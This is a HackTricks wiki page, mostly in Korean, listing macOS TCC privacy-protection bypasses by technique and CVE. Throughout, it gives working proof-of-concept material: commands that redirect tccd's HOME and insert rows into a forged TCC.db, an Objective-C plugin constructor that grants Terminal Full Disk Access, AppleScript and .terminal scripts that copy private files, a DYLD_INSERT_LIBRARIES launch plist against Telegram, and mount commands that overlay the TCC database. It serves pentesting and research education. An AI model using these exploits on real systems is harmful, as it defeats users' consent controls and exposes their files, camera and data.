# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 기능별

### Write Bypass

이는 bypass가 아니라 TCC가 작동하는 방식일 뿐입니다: **쓰기 작업은 보호하지 않습니다**. Terminal에 **사용자의 Desktop을 읽을 권한이 없어도 해당 위치에 계속 쓸 수 있습니다**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**는 새 **file**에 추가되어 **creators app**이 해당 파일을 읽을 수 있는 access 권한을 부여합니다.

### TCC ClickJacking

사용자가 인지하지 못한 채 **TCC prompt를 accept**하도록 **TCC prompt 위에 window를 띄우는 것**이 가능합니다. PoC는 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**에서 확인할 수 있습니다.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker는 **어떤 이름이든 사용하여 app을 생성**할 수 있습니다(예: Finder, Google Chrome...). **`Info.plist`**에 해당 이름을 지정하고 TCC protected location에 대한 access를 요청하도록 만들 수 있습니다. 사용자는 legit application이 이 access를 요청한다고 생각하게 됩니다.\
또한 **Dock에서 legit app을 제거하고 fake one을 그 자리에 배치**할 수도 있습니다. 따라서 사용자가 fake one을 클릭하면(동일한 icon을 사용할 수 있음) fake one이 legit one을 호출하고 TCC permissions를 요청한 뒤 malware를 실행하여, 사용자가 legit app이 access를 요청했다고 믿게 만들 수 있습니다.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

추가 정보와 PoC는 다음에서 확인할 수 있습니다:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

기본적으로 **SSH를 통한 access에는 "Full Disk Access"가 부여되어 있었습니다**. 이를 disable하려면 해당 항목이 목록에 있으면서 disabled 상태여야 합니다(목록에서 제거해도 해당 privileges가 제거되지는 않음):

![TCC Request by arbitrary name - SSH Bypass: 기본적으로 SSH를 통한 access에는 "Full Disk Access"가 부여되어 있습니다. 이를 disable하려면 목록에 해당 항목이 있으면서 disabled 상태여야 합니다(목록에서 제거해도...](<../../../../../images/image (1077).png>)

다음에서 일부 **malware가 이 protection을 bypass할 수 있었던 방법의 examples**를 확인할 수 있습니다:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 이제 SSH를 enable하려면 **Full Disk Access**가 필요합니다.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute는 **특정 application에 파일을 읽을 permissions를 부여하기 위해** files에 설정됩니다. 이 attribute는 파일을 app 위로 **drag\&drop**하거나, 사용자가 파일을 **default application으로 열기 위해 double-click**할 때 설정됩니다.

따라서 사용자는 **모든 extensions를 처리하도록 malicious app을 register**하고 Launch Services를 호출하여 모든 파일을 **open**하도록 만들 수 있습니다(그러면 malicious file에 해당 파일을 읽을 access가 부여됨).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement를 사용하면 **iCloud tokens를 제공하는** **`com.apple.iCloudHelper`** XPC service와 communicate할 수 있습니다.

**iMovie**와 **Garageband**에는 이 entitlement 및 이를 가능하게 하는 다른 entitlement들이 있었습니다.

해당 entitlement를 통해 **icloud tokens를 획득하는** exploit에 대한 자세한 **information**은 다음 talk를 확인하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission이 있는 app은 **다른 Apps를 control**할 수 있습니다. 즉, **다른 Apps에 부여된 permissions를 abuse**할 수 있습니다.

Apple Scripts에 대한 자세한 info는 다음을 확인하세요:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

예를 들어 App에 **`iTerm`에 대한 Automation permission**이 있으면, 이 예시에서는 **`Terminal`**이 iTerm에 access할 수 있습니다:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA가 없는 Terminal은 FDA가 있는 iTerm을 호출하고 이를 사용하여 다음 actions를 수행할 수 있습니다:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder를 통한 접근

또는 App이 Finder에 대한 접근 권한을 가지고 있다면, 다음과 같은 script일 수 있습니다:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 앱 동작별

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon**은 **`HOME`** **env** 변수를 사용하여 다음 위치에서 TCC users database에 접근합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면, 그리고 TCC daemon이 현재 사용자의 domain 내에서 `launchd`를 통해 실행되기 때문에, 해당 daemon에 전달되는 **모든 environment variables를 제어**할 수 있습니다.\
따라서 **attacker는 `launchctl`에서 `$HOME` environment** 변수를 **controlled** **directory**를 가리키도록 설정하고, **TCC** daemon을 **restart**한 다음, **end user에게 알림을 표시하지 않고도 TCC database를 직접 수정**하여 자신에게 사용 가능한 **모든 TCC entitlement를 부여**할 수 있습니다.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - 메모

Notes는 TCC로 보호되는 위치에 접근할 수 있었지만, 메모가 생성될 때 메모는 **보호되지 않는 위치에 생성**됩니다. 따라서 Notes에 보호된 파일을 메모에 복사하도록 요청한 다음 해당 파일에 접근할 수 있었습니다:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

라이브러리 `libsecurity_translocate`를 사용하는 바이너리 `/usr/libexec/lsd`에는 **nullfs** mount를 생성할 수 있도록 허용하는 `com.apple.private.nullfs_allow` entitlement와, 모든 파일에 접근할 수 있도록 **`kTCCServiceSystemPolicyAllFiles`**가 포함된 `com.apple.private.tcc.allow` entitlement가 있었습니다.

"Library"에 quarantine attribute를 추가하고 **`com.apple.security.translocation`** XPC service를 호출하면 Library가 **`$TMPDIR/AppTranslocation/d/d/Library`**에 매핑되며, Library 내부의 모든 문서에 **접근**할 수 있었습니다.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**에는 흥미로운 기능이 있습니다. 실행 중일 때 **`~/Music/Music/Media.localized/Automatically Add to Music.localized`**에 드롭된 파일을 사용자의 "media library"로 **import**합니다. 또한 다음과 같은 **`rename(a, b);`**를 호출합니다. 여기서 `a`와 `b`는 다음과 같습니다:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

이 **`rename(a, b);`** 동작은 **Race Condition**에 취약합니다. `Automatically Add to Music.localized` 폴더 안에 가짜 **TCC.db** 파일을 넣은 다음, 새 폴더(b)가 생성되었을 때 파일을 복사하고 삭제한 뒤 **`~/Library/Application Support/com.apple.TCC`**/를 가리키도록 할 수 있기 때문입니다.  
**추가 정보**는 [**writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)에 있습니다.


### SQLITE_SQLLOG_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`**는 기본적으로 **열린 모든 db가 해당 경로에 복사된다**는 의미입니다. 이 CVE에서는 이 제어 기능을 악용하여 **SQLite database**에 **write**할 수 있었습니다. 이 database는 FDA가 있는 process에 의해 TCC database로 **열리게 되며**, 이후 파일 이름에 **symlink**를 사용한 **`SQLITE_SQLLOG_DIR`**를 악용하여 해당 database가 **열릴 때** 사용자의 **TCC.db가 열린 database로 덮어써지도록** 했습니다.\
**추가 정보**는 [**writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)과 **[ **talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s)에 있습니다.

### **SQLITE_AUTO_TRACE**

환경 변수 **`SQLITE_AUTO_TRACE`**가 설정되면 라이브러리 **`libsqlite3.dylib`**가 모든 SQL query를 **logging**하기 시작합니다. 많은 애플리케이션이 이 라이브러리를 사용하므로 모든 SQLite query를 기록할 수 있었습니다.

여러 Apple 애플리케이션이 TCC로 보호되는 정보에 접근하기 위해 이 라이브러리를 사용했습니다.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

이 **env variable은 `Metal` framework에서 사용**되며, 이는 여러 프로그램의 dependency입니다. 특히 FDA를 보유한 `Music`에서 사용됩니다.

다음을 설정합니다: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. `path`가 유효한 directory라면 bug가 trigger되며, `fs_usage`를 사용해 프로그램에서 무슨 일이 발생하는지 확인할 수 있습니다.

- `path/.dat.nosyncXXXX.XXXXXX`라는 file이 `open()`됩니다. (X는 random)
- 하나 이상의 `write()`가 file에 contents를 기록합니다. (이 contents는 우리가 control할 수 없습니다.)
- `path/.dat.nosyncXXXX.XXXXXX`가 `path/name`으로 `renamed()`됩니다.

이는 temporary file write 후 **secure하지 않은 `rename(old, new)`**가 수행되는 방식입니다.

secure하지 않은 이유는 **old path와 new path를 별도로 resolve해야 하기 때문**이며, 이 과정에 시간이 걸리고 Race Condition에 취약할 수 있습니다. 자세한 내용은 `xnu` function인 `renameat_internal()`을 확인할 수 있습니다.

> [!CAUTION]
> 따라서 기본적으로 privileged process가 여러분이 control하는 folder에서 rename을 수행한다면, RCE에 성공하여 다른 file에 access하게 만들거나, 이 CVE처럼 privileged app이 생성한 file을 열고 FD를 저장하게 만들 수 있습니다.
>
> rename이 여러분이 control하는 folder에 access하는 경우, source file을 modified했거나 해당 file의 FD를 보유한 상태에서 destination file 또는 folder가 symlink를 가리키도록 변경하면 원하는 때 write할 수 있습니다.

이것이 CVE에서 사용된 attack입니다. 예를 들어, 사용자의 `TCC.db`를 overwrite하려면 다음을 수행할 수 있습니다.

- `/Users/hacker/ourlink`가 `/Users/hacker/Library/Application Support/com.apple.TCC/`를 가리키도록 생성
- `/Users/hacker/tmp/` directory 생성
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` 설정
- 이 env var를 사용해 `Music`을 실행하여 bug trigger
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`의 `open()`을 catch합니다. (X는 random)
- 여기서도 이 file을 write용으로 `open()`하고 file descriptor를 유지합니다.
- loop에서 `/Users/hacker/tmp`와 `/Users/hacker/ourlink`를 **atomically switch**
- race window가 매우 짧기 때문에 성공 가능성을 높이기 위해 이렇게 수행하지만, race에서 지더라도 downside는 거의 없습니다.
- 잠시 대기
- 성공했는지 test
- 성공하지 못했다면 처음부터 다시 실행

자세한 정보는 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)를 참조하세요.

> [!CAUTION]
> 이제 `MTL_DUMP_PIPELINES_TO_JSON_FILE` env variable을 사용하려고 하면 apps가 launch되지 않습니다.

### Apple Remote Desktop

root로 이 service를 enable하면 **ARD agent가 full disk access를 가지게 되며**, 이후 user가 이를 abuse하여 새로운 **TCC user database**를 copy하도록 만들 수 있습니다.

## By **NFSHomeDirectory**

TCC는 user에게 specific한 resources에 대한 access를 control하기 위해 user의 HOME folder에 있는 database인 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**를 사용합니다.\
따라서 user가 `$HOME` env variable이 **different folder**를 가리키도록 하여 TCC를 restart할 수 있다면, user는 **/Library/Application Support/com.apple.TCC/TCC.db**에 새로운 TCC database를 생성하고 TCC를 trick하여 어떤 app에도 원하는 TCC permission을 grant하도록 만들 수 있습니다.

> [!TIP]
> Apple은 user profile에 저장된 **`NFSHomeDirectory`** attribute의 setting을 **`$HOME`의 value**로 사용합니다. 따라서 이 value를 modify할 permission(**`kTCCServiceSystemPolicySysAdminFiles`**)이 있는 application을 compromise하면 이 option을 TCC bypass에 **weaponize**할 수 있습니다.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 user의 **HOME** folder를 modify합니다.

1. target app에 대한 _csreq_ blob을 가져옵니다.
2. required access와 _csreq_ blob이 포함된 fake _TCC.db_ file을 plant합니다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)를 사용하여 user의 Directory Services entry를 export합니다.
4. user의 home directory를 변경하도록 Directory Services entry를 modify합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 modified된 Directory Services entry를 import합니다.
6. user의 _tccd_를 stop하고 process를 reboot합니다.

두 번째 POC는 `kTCCServiceSystemPolicySysAdminFiles` value를 가진 **`/usr/libexec/configd`**의 `com.apple.private.tcc.allow`를 사용했습니다.\
`configd`를 **`-t`** option과 함께 실행할 수 있었으며, attacker는 **load할 custom Bundle을 지정**할 수 있었습니다. 따라서 exploit은 user의 home directory를 변경하는 **`dsexport`** 및 **`dsimport`** method를 **`configd` code injection**으로 **replace**합니다.

자세한 내용은 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 참조하세요.

## By process injection

process 내부에 code를 inject하고 TCC privilege를 abuse하는 다양한 technique이 있습니다.

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

또한 TCC를 bypass하기 위해 발견된 가장 common한 process injection은 **plugins (load library)**를 통한 방식입니다.\
Plugins는 일반적으로 libraries 또는 plist 형태의 extra code이며, **main application에 의해 loaded**되어 해당 context에서 실행됩니다. 따라서 main application이 granted permissions 또는 entitlements를 통해 TCC restricted files에 access할 수 있다면, **custom code도 동일한 access를 가지게 됩니다**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application은 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement를 가지고 있었고, **`.daplug`** extension을 가진 plugins를 load했으며, **hardened** runtime이 없었습니다.

이 CVE를 weaponize하려면 **`NFSHomeDirectory`**를 **changed**해야 합니다. 이는 이전 entitlement를 abuse하여 TCC를 bypass하기 위해 **user의 TCC database를 take over**할 수 있도록 합니다.

자세한 내용은 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)를 참조하세요.

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` entitlements를 가지고 있었습니다. 첫 번째 entitlement는 **code injection을 허용**하고, 두 번째 entitlement는 **TCC를 manage할 access**를 부여합니다.

이 binary는 `/Library/Audio/Plug-Ins/HAL` folder에서 **third-party plug-ins**를 load할 수 있었습니다. 따라서 다음 POC를 사용하여 **plugin을 load하고 TCC permissions를 abuse**할 수 있었습니다.
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
자세한 내용은 [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O를 통해 카메라 스트림을 여는 system applications (**`kTCCServiceCamera`**가 적용된 apps)는 `/Library/CoreMediaIO/Plug-Ins/DAL`에 위치한 **이 plugins를 프로세스에 로드**합니다(SIP 제한이 적용되지 않음).

이 위치에 일반적인 **constructor**가 포함된 library를 저장하는 것만으로도 **code injection**이 가능합니다.

여러 Apple applications가 이 취약점의 영향을 받았습니다.

### Firefox

Firefox application에는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` entitlements가 있었습니다:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
이 방법을 쉽게 exploit하는 방법에 대한 자세한 내용은 [**원본 보고서**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)를 확인하세요.

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`에는 **`com.apple.private.tcc.allow`** 및 **`com.apple.security.get-task-allow`** entitlements가 있었으며, 이를 통해 프로세스 내부에 코드를 inject하고 TCC privileges를 사용할 수 있었습니다.

### CVE-2023-26818 - Telegram

Telegram에는 **`com.apple.security.cs.allow-dyld-environment-variables`** 및 **`com.apple.security.cs.disable-library-validation`** entitlements가 있었으므로, 이를 abuse하여 카메라를 사용한 recording과 같이 **해당 앱의 permissions에 access**할 수 있었습니다. [**writeup에서 payload를 확인할 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

env variable을 사용해 library를 load하기 위해 **`custom plist`**를 생성하여 이 library를 inject하고, **`launchctl`**을 사용해 이를 launch했다는 점에 주목하세요:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open 호출을 통한

**`open`**은 sandboxed 상태에서도 호출할 수 있습니다.

### Terminal Scripts

특히 기술 관련 사용자가 사용하는 컴퓨터에서는 Terminal에 **Full Disk Access (FDA)** 권한을 부여하는 경우가 매우 흔합니다. 그리고 이를 사용하여 **`.terminal`** scripts를 호출할 수 있습니다.

**`.terminal`** scripts는 다음과 같이 실행할 명령을 **`CommandString`** 키에 포함하는 plist 파일입니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
애플리케이션은 /tmp와 같은 위치에 terminal script를 작성한 후 다음과 같은 명령어로 실행할 수 있습니다:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**모든 사용자**(권한이 없는 사용자도 포함)는 time machine snapshot을 생성하고 마운트하여 해당 snapshot의 **모든 파일에 액세스**할 수 있습니다.\
필요한 **유일한 권한**은 사용된 애플리케이션(예: `Terminal`)에 **Full Disk Access** (FDA) 액세스 권한(`kTCCServiceSystemPolicyAllfiles`)이 부여되어 있는 것이며, 이 권한은 관리자가 부여해야 합니다.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
더 자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 및 CVE-2021-30808 - TCC 파일 위에 마운트

TCC DB 파일이 보호되고 있더라도, **디렉터리 위에** 새로운 TCC.db 파일을 마운트하는 것이 가능했습니다:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)에서 **full exploit**를 확인하세요.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)에서 설명한 것처럼, 이 CVE는 `diskarbitrationd`를 악용했습니다.

공개 `DiskArbitration` framework의 `DADiskMountWithArgumentsCommon` 함수가 security checks를 수행했습니다. 그러나 `diskarbitrationd`를 직접 호출하면 이를 bypass할 수 있으므로, 경로에 `../` 요소와 symlinks를 사용할 수 있습니다.

이를 통해 공격자는 모든 위치에 arbitrary mounts를 수행할 수 있었습니다. 여기에는 `diskarbitrationd`의 `com.apple.private.security.storage-exempt.heritable` entitlement로 인해 TCC database를 덮어 마운트하는 것도 포함됩니다.

### asr

**`/usr/sbin/asr`** tool을 사용하면 전체 디스크를 복사하고 다른 위치에 마운트하여 TCC protections를 bypass할 수 있었습니다.

### Location Services

**location services에 access가 허용된** clients를 나타내는 세 번째 TCC database가 **`/var/db/locationd/clients.plist`**에 있습니다.\
**`/var/db/locationd/` 폴더는 DMG mounting으로부터 보호되지 않았으므로**, 자체 plist를 마운트할 수 있었습니다.

## startup apps를 통한 방법


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep을 통한 방법

여러 경우에 files는 emails, phone numbers, messages...와 같은 sensitive information을 보호되지 않은 locations에 저장합니다(Apple에서는 이를 vulnerability로 간주합니다).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

이 방법은 더 이상 작동하지 않지만, [**과거에는 작동했습니다**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)를 사용하는 또 다른 방법:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## 참고 자료

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**macOS Privacy Mechanisms를 Bypass하는 20가지 이상의 방법**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**TCC에 대한 Knockout Win - MacOS Privacy Mechanisms를 Bypass하는 20가지 이상의 새로운 방법**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
